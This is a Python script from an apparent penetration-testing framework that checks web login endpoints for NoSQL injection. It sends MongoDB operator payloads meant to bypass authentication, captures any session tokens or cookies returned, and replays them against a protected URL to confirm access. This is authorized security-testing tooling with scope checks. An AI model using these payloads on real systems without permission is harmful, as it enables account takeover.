#!/usr/bin/env python3
"""NoSQL injection validator with strict bypass confirmation.

Testa operadores MongoDB-like:
  - $ne (not equal) -> bypass de autenticacao
  - $gt (greater than) -> enumeracao
  - $regex -> extracao parcial
  - $exists -> descoberta
  - $where -> RCE em alguns casos

Um finding so eh confirmado quando ha prova positiva de bypass:
  - token ou cookie autenticado na resposta, ou identidade indevida; E
  - follow-up para recurso protegido usando esse token/cookie succeede.
"""

from __future__ import annotations

import argparse
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "engine"))
sys.path.insert(0, str(ROOT / "adapters"))

import redlensctl  # noqa: E402
from semantic_authz import compare_bodies  # noqa: E402


NOSQL_PAYLOADS = {
    "auth_bypass": [
        {"username": {"$ne": ""}, "password": {"$ne": ""}},
        {"username": "admin", "password": {"$gt": ""}},
        {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
    ],
    "extraction": [
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"username": {"$exists": True}, "password": {"$exists": True}},
    ],
    "where_injection": [
        {"username": "admin", "password": {"$where": "1"}},
    ],
    "operator_injection": [
        {"username[$ne]": "x", "password[$ne]": "x"},
        {"username": {"$regex": ".*"}, "password": {"$regex": ".*}"}},
    ],
}


REJECTION_STATUSES = {400, 401, 403}
AUTH_TOKEN_NAMES = {
    "authorization", "x-access-token", "x-auth-token", "access-token",
    "token", "jwt", "session", "sessionid", "session-id", "connect.sid",
}
IDENTITY_FIELDS = {
    "user_id", "userId", "id", "sub", "subject", "username", "email",
    "account_id", "accountId", "identity",
}


def http_post_json(url: str, body: dict, headers: dict | None = None) -> tuple[int, dict, bytes]:
    req_headers = {"Content-Type": "application/json"}
    if headers:
        req_headers.update(headers)
    req = urllib.request.Request(url, data=json.dumps(body).encode("utf-8"), method="POST", headers=req_headers)
    try:
        with urllib.request.urlopen(req, timeout=30) as response:
            return response.status, dict(response.headers), response.read(64 * 1024)
    except urllib.error.HTTPError as exc:
        return exc.code, dict(exc.headers or {}), exc.read(64 * 1024) if hasattr(exc, "read") else b""
    except Exception as exc:
        raise redlensctl.RedLensError(f"Falha: {exc}") from exc


def http_get(url: str, headers: dict | None = None) -> tuple[int, dict, bytes]:
    req_headers = {}
    if headers:
        req_headers.update(headers)
    req = urllib.request.Request(url, method="GET", headers=req_headers)
    try:
        with urllib.request.urlopen(req, timeout=30) as response:
            return response.status, dict(response.headers), response.read(64 * 1024)
    except urllib.error.HTTPError as exc:
        return exc.code, dict(exc.headers or {}), exc.read(64 * 1024) if hasattr(exc, "read") else b""
    except Exception as exc:
        raise redlensctl.RedLensError(f"Falha: {exc}") from exc


def try_payload(url: str, payload: dict) -> tuple[int, dict, bytes]:
    return http_post_json(url, payload)


def _try_decode(body: bytes) -> dict | str:
    try:
        return json.loads(body.decode("utf-8", errors="ignore"))
    except json.JSONDecodeError:
        return body.decode("utf-8", errors="ignore")[:512]


def extract_auth_token(headers: dict, body: dict | str) -> tuple[str | None, str | None]:
    """Retorna (token_header, cookie) se houver indicio de sessao autenticada."""
    token = None
    cookie = None
    for name, value in headers.items():
        lower = name.lower()
        if lower in AUTH_TOKEN_NAMES or "token" in lower or "session" in lower:
            token = value
            break
        if lower == "set-cookie":
            cookie = value
            break
    if isinstance(body, dict):
        for key in body:
            lower = key.lower()
            if lower in AUTH_TOKEN_NAMES or "token" in lower or "session" in lower:
                value = body[key]
                if isinstance(value, str):
                    token = value
                    break
    return token, cookie


def extract_identity(body: dict | str, baseline_body: dict | str) -> dict | None:
    """Retorna identidade indevida se um campo de identidade diferir do baseline."""
    if not isinstance(body, dict) or not isinstance(baseline_body, dict):
        return None
    identity_diff = {}
    for field in IDENTITY_FIELDS:
        if field in body and field in baseline_body:
            if body[field] != baseline_body[field]:
                identity_diff[field] = {"payload": body[field], "baseline": baseline_body[field]}
        elif field in body and field not in baseline_body:
            identity_diff[field] = {"payload": body[field], "baseline": None}
    return identity_diff if identity_diff else None


def follow_up_success(url: str, token: str | None, cookie: str | None) -> bool:
    if not url:
        return False
    headers = {}
    if token:
        headers["Authorization"] = token if token.lower().startswith(("bearer ", "basic ")) else f"Bearer {token}"
    if cookie:
        headers["Cookie"] = cookie
    status, _, _ = http_get(url, headers)
    return 200 <= status < 300


def is_bypass_proven(
    status: int,
    headers: dict,
    body: dict | str,
    baseline_status: int,
    baseline_headers: dict,
    baseline_body: dict | str,
    protected_url: str | None,
) -> tuple[bool, dict]:
    """Verifica se ha prova positiva de login bypass."""
    proof = {"status": status, "reasons": []}

    if status == baseline_status:
        return False, proof

    if status in REJECTION_STATUSES:
        proof["reasons"].append("status de rejeicao")
        return False, proof

    token, cookie = extract_auth_token(headers, body)
    identity = extract_identity(body, baseline_body)

    if not token and not cookie and not identity:
        proof["reasons"].append("sem token/cookie/identidade indevida")
        return False, proof

    if identity:
        proof["reasons"].append(f"identidade indevida: {list(identity.keys())}")
    if token:
        proof["reasons"].append("token presente")
    if cookie:
        proof["reasons"].append("cookie presente")

    if protected_url and follow_up_success(protected_url, token, cookie):
        proof["reasons"].append("follow-up para recurso protegido succeedeu")
        return True, proof

    proof["reasons"].append("follow-up nao succeedeu ou nao configurado")
    return False, proof


def main() -> int:
    parser = argparse.ArgumentParser(prog="nosqli-validator")
    parser.add_argument("--run", required=True)
    parser.add_argument("--url", required=True)
    parser.add_argument("--baseline", help="JSON com credenciais validas conhecidas")
    parser.add_argument("--protected-url", help="URL de recurso protegido para validar bypass")
    parser.add_argument("--type", choices=("login", "query"), default="login")
    parser.add_argument("--negative-control-only", action="store_true", help="Apenas envia baseline invalido e verifica rejeicao")
    args = parser.parse_args()

    try:
        directory = redlensctl.run_dir(args.run)
        redlensctl.scoped_url(directory, args.url)
        if args.protected_url:
            redlensctl.scoped_url(directory, args.protected_url)

        if args.baseline:
            baseline = json.loads(Path(args.baseline).read_text(encoding="utf-8"))
        else:
            baseline = {"username": "redlens_test_user", "password": "redlens_test_pass"}

        invalid_credentials = {"username": "redlens_invalid_user", "password": "redlens_invalid_pass"}

        timestamp = redlensctl.iso().replace(":", "").replace("-", "")
        raw_dir = directory / "evidence" / "raw"
        raw_dir.mkdir(parents=True, exist_ok=True)
        suffix = redlensctl.safe_id("token", args.url)[:12]

        def save_raw(label: str, body: bytes) -> str:
            path = raw_dir / f"{timestamp}-nosqli-{label}-{suffix}.bin"
            redlensctl.write_raw(path, body)
            return str(path.relative_to(directory))

        # Controle negativo real: credenciais invalidas devem ser rejeitadas.
        negative_status, negative_headers, negative_body = http_post_json(args.url, invalid_credentials)
        negative_body_decoded = _try_decode(negative_body)
        negative_raw = save_raw("negative", negative_body)
        negative_control_evidence = {
            "url": args.url,
            "credentials": invalid_credentials,
            "status": negative_status,
            "headers": negative_headers,
            "body": negative_body_decoded,
            "raw_response": negative_raw,
            "rejected": negative_status in REJECTION_STATUSES or negative_status >= 400,
        }

        if args.negative_control_only:
            sanitized_dir = directory / "evidence" / "sanitized"
            sanitized_dir.mkdir(parents=True, exist_ok=True)
            summary_path = sanitized_dir / f"{timestamp}-nosqli-negative-{suffix}.json"
            summary = {
                "capability": "nosqli",
                "mode": "negative-control-only",
                "url": args.url,
                "negative_control": negative_control_evidence,
                "verdict": "tested-negative" if negative_control_evidence["rejected"] else "needs_review",
            }
            redlensctl.write_json(summary_path, summary)
            redlensctl.append_event(directory, "nosqli.negative_control", {
                "url": args.url,
                "rejected": negative_control_evidence["rejected"],
            })
            redlensctl.append_event(directory, "validator.finished", {
                "capability": "nosqli",
                "verdict": summary["verdict"],
                "url": args.url,
            })
            print(json.dumps({
                "ok": True,
                "verdict": summary["verdict"],
                "negative_control": negative_control_evidence,
            }, ensure_ascii=False, indent=2))
            return 0

        # Baseline das credenciais fornecidas (pode ser valida ou conhecida).
        baseline_status, baseline_headers, baseline_body = http_post_json(args.url, baseline)
        baseline_body_decoded = _try_decode(baseline_body)
        baseline_raw = save_raw("baseline", baseline_body)

        bypass_findings = []
        observations = []

        for category, payloads in NOSQL_PAYLOADS.items():
            for idx, payload in enumerate(payloads):
                status, headers, resp_body = try_payload(args.url, payload)
                resp_body_decoded = _try_decode(resp_body)
                payload_raw = save_raw(f"{category}-{idx}", resp_body)

                if status in REJECTION_STATUSES:
                    continue

                proven, proof = is_bypass_proven(
                    status, headers, resp_body_decoded,
                    baseline_status, baseline_headers, baseline_body_decoded,
                    args.protected_url,
                )

                entry = {
                    "category": category,
                    "payload": payload,
                    "status": status,
                    "baseline_status": baseline_status,
                    "raw_response": payload_raw,
                    "proof": proof,
                }

                if proven:
                    bypass_findings.append(entry)
                else:
                    # Diferenca de status ou leak semantico so gera observacao.
                    observations.append(entry)

        verdict = "tested-negative"
        confidence = "medium"
        if bypass_findings:
            verdict = "confirmed"
            confidence = "high"
        elif observations:
            verdict = "observation"
            confidence = "low"

        sanitized_dir = directory / "evidence" / "sanitized"
        sanitized_dir.mkdir(parents=True, exist_ok=True)
        summary_path = sanitized_dir / f"{timestamp}-nosqli-{suffix}.json"
        summary = {
            "capability": "nosqli",
            "verdict": verdict,
            "confidence": confidence,
            "url": args.url,
            "type": args.type,
            "protected_url": args.protected_url,
            "baseline_status": baseline_status,
            "raw_response_baseline": baseline_raw,
            "negative_control": negative_control_evidence,
            "bypass_findings_count": len(bypass_findings),
            "observations_count": len(observations),
            "bypass_findings": bypass_findings,
            "observations": observations,
        }
        redlensctl.write_json(summary_path, summary)

        if verdict == "confirmed":
            finding_id = redlensctl.safe_id("nosqli", args.url)[:24]
            redlensctl.write_json(directory / "findings" / f"{finding_id}.json", {
                "id": finding_id,
                "title": f"NoSQL injection via JSON body em {args.url}",
                "severity": "high",
                "status": "confirmed",
                "asset": args.url,
                "evidence": [str(summary_path.relative_to(directory))],
                "reproduced": bool(bypass_findings),
                "negative_control": True,
                "created_at": redlensctl.iso(),
            })

        redlensctl.append_event(directory, "nosqli.validated", {
            "verdict": verdict,
            "url": args.url,
            "bypass_findings_count": len(bypass_findings),
            "observations_count": len(observations),
        })
        redlensctl.append_event(directory, "validator.finished", {
            "capability": "nosqli",
            "verdict": verdict,
            "url": args.url,
        })

        print(json.dumps({
            "ok": True,
            "verdict": verdict,
            "confidence": confidence,
            "bypass_findings": bypass_findings,
            "observations": observations,
            "negative_control": negative_control_evidence,
        }, ensure_ascii=False, indent=2))
        return 0
    except (
        redlensctl.RedLensError,
        KeyError,
        ValueError,
        json.JSONDecodeError,
    ) as exc:
        print(json.dumps({"ok": False, "error": str(exc)}, ensure_ascii=False), file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
